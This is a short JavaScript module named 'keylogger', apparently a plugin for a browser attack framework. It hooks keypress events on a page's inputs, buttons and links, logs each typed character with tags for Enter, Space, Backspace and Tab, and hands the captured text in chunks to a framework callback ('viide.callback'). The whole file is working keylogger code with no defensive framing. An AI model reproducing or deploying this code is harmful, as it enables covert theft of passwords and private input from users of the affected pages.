this.name = 'keylogger';
this.start = function() {
  this.chars21902901290 = "";
  $("document, input, button, a").keypress(function(event) {
    if(event.charCode == 13) {
      this.chars21902901290 += '[ENTER]';
    } else if(event.charCode == 32) {
      this.chars21902901290 += '[SPACE]';
    } else if(event.charCode == 8) {
      this.chars21902901290 += '[BACKSPACE]';
    } else if(event.charCode == 9) {
      this.chars21902901290 += '[TAB]';
    } else {
      this.chars21902901290 += String.fromCharCode(event.charCode);
    }
    if(event.charCode == 13 || event.charCode == 32 || event.charCode == 9 || event.charCode == 37 || event.charCode == 38 || event.charCode == 39 || event.charCode == 40) {
      viide.callback(this.chars21902901290);
      this.chars21902901290 = "";
    }
  });
}
